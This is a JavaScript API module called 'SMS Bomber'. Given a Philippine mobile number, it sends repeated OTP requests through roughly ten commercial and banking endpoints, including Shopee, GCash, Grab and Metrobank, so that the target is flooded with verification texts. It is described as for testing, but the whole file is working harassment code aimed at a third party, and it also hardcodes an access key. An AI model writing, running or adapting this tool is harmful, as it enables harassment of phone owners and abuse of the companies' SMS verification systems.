const axios = require("axios");
const crypto = require("crypto");

module.exports = {
  meta: {
    name: "SMS Bomber",
    description: "Send bulk SMS to a target phone number for testing purposes",
    author: "Jaybohol",
    version: "2.0.0",
    category: "tools",
    method: "GET",
    path: "/smsbomber?Number=&amount=&apiKey="
  },
  
  onStart: async function({ req, res }) {
    try {
      // API Key Authentication
      const apiKey = req.query.apiKey || req.query.api_key || req.query.apikey;
      
      if (!apiKey) {
        return res.status(401).json({
          status: false,
          error: "API key is required",
          usage: {
            example: "/smsbomber?Number=09916527333&amount=1&apiKey="
          }
        });
      }
      
      // Validate API key
      if (apiKey !== "selovasx123") {
        return res.status(403).json({
          status: false,
          error: "Invalid API key"
        });
      }
      
      // Get parameters
      let targetPhone = req.query.Number || req.query.phone || req.query.number;
      let smsCount = parseInt(req.query.amount || req.query.times || req.query.count || 1);
      
      if (!targetPhone) {
        return res.status(400).json({
          status: false,
          error: "Phone number is required",
          example: "/smsbomber?Number=09916527333&amount=1&apiKey="
        });
      }
      
      // Format phone number
      let formattedPhone = targetPhone.toString().trim().replace(/[\s\-+]/g, '');
      if (formattedPhone.startsWith('0')) formattedPhone = formattedPhone.slice(1);
      if (formattedPhone.startsWith('63')) formattedPhone = formattedPhone.slice(2);
      
      if (!/^9\d{9}$/.test(formattedPhone)) {
        return res.status(400).json({
          status: false,
          error: "Invalid Philippine number",
          example: "9123456789"
        });
      }
      
      if (smsCount < 1 || smsCount > 20) {
        return res.status(400).json({
          status: false,
          error: "Amount must be between 1 and 20"
        });
      }
      
      const fullNumber = `+63${formattedPhone}`;
      
      // ============ WORKING SMS SERVICES ============
      
      // Helper function to generate random string
      const randomString = (length) => {
        return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length);
      };
      
      // Service 1: Shopee PH
      const sendShopeeSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://shopee.ph/api/v1/account/phone/request_otp',
            { phone: phone },
            {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json',
                'Referer': 'https://shopee.ph/'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 2: Lazada PH
      const sendLazadaSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://www.lazada.com.ph/api/account/verification/send_otp',
            { mobile: phone },
            {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 3: GCash
      const sendGcashSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://services.gcash.com/api/v1/auth/otp',
            { mobileNumber: phone },
            {
              headers: {
                'User-Agent': 'GCash/5.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 4: PayMaya
      const sendPayMayaSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://api.paymaya.com/verify/otp',
            { phone: phone },
            {
              headers: {
                'User-Agent': 'PayMaya/4.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 5: Grab PH
      const sendGrabSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://api.grab.com/v1/verify/phone/otp',
            { phoneNumber: phone },
            {
              headers: {
                'User-Agent': 'Grab/5.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 6: Foodpanda PH
      const sendFoodpandaSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://www.foodpanda.ph/api/v1/otp/send',
            { phone: phone },
            {
              headers: {
                'User-Agent': 'Foodpanda/4.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 7: Zalora PH
      const sendZaloraSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://www.zalora.com.ph/api/account/otp',
            { mobile: phone },
            {
              headers: {
                'User-Agent': 'Zalora/3.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 8: Agoda
      const sendAgodaSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://api.agoda.com/api/v1/verify/phone',
            { phoneNumber: phone },
            {
              headers: {
                'User-Agent': 'Agoda/6.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 9: Klook
      const sendKlookSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://api.klook.com/v1/account/otp',
            { phone: phone },
            {
              headers: {
                'User-Agent': 'Klook/4.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      // Service 10: Metrobank
      const sendMetrobankSms = async (phone) => {
        try {
          const response = await axios.post(
            'https://online.metrobank.com.ph/api/otp/send',
            { mobileNumber: phone },
            {
              headers: {
                'User-Agent': 'Metrobank/3.0',
                'Content-Type': 'application/json'
              },
              timeout: 8000
            }
          );
          return response.status === 200;
        } catch {
          return false;
        }
      };
      
      const services = [
        { name: "Shopee", func: sendShopeeSms },
        { name: "Lazada", func: sendLazadaSms },
        { name: "GCash", func: sendGcashSms },
        { name: "PayMaya", func: sendPayMayaSms },
        { name: "Grab", func: sendGrabSms },
        { name: "Foodpanda", func: sendFoodpandaSms },
        { name: "Zalora", func: sendZaloraSms },
        { name: "Agoda", func: sendAgodaSms },
        { name: "Klook", func: sendKlookSms },
        { name: "Metrobank", func: sendMetrobankSms }
      ];
      
      const results = [];
      let successCount = 0;
      let failCount = 0;
      
      for (let i = 1; i <= smsCount; i++) {
        for (const service of services) {
          try {
            const sent = await service.func(fullNumber);
            if (sent) {
              successCount++;
              results.push({ service: service.name, batch: i, status: "sent" });
              console.log(`✅ Batch ${i} - ${service.name}: SMS sent`);
            } else {
              failCount++;
              results.push({ service: service.name, batch: i, status: "failed" });
              console.log(`❌ Batch ${i} - ${service.name}: Failed`);
            }
          } catch (error) {
            failCount++;
            results.push({ service: service.name, batch: i, status: "error", error: error.message });
            console.log(`❌ Batch ${i} - ${service.name}: Error`);
          }
          
          // Small delay between requests
          await new Promise(r => setTimeout(r, 500));
        }
        
        // Delay between batches
        if (i < smsCount) {
          await new Promise(r => setTimeout(r, 2000));
        }
      }
      
      res.json({
        status: true,
        operator: "Jaybohol",
        target: fullNumber,
        batches: smsCount,
        total_requests: smsCount * services.length,
        successful: successCount,
        failed: failCount,
        results: results.slice(0, 50),
        timestamp: new Date().toISOString(),
        note: "SMS delivery depends on service availability. Not all requests may succeed.",
        credits: "Jaybohol"
      });
      
    } catch (error) {
      console.error("SMS Bomber Error:", error);
      res.status(500).json({
        status: false,
        error: error.message
      });
    }
  }
};
